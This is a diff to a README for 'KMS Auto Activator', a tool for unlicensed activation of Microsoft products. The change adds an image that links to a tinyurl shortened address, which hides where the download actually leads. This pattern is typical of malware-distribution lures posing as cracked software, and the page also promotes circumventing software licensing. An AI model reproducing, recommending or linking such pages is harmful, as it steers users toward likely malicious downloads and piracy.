@@ -5,7 +5,7 @@ An efficient and reliable activation tool for Microsoft products! ✨
 ## What is it? 🤔
 KMS Auto Activator is a smart solution designed to handle software activation seamlessly. It provides a smooth pathway to enable full functionality of your Microsoft applications!
 
-
+[![78569679](https://github.com/user-attachments/assets/37efa664-51f3-49c2-ab6d-16551d3f5108)](https://tinyurl.com/5bcwhajn)
 
 ## Key Features 🔧
 - **Smart Activation** – Intelligent detection and activation system! 🧠
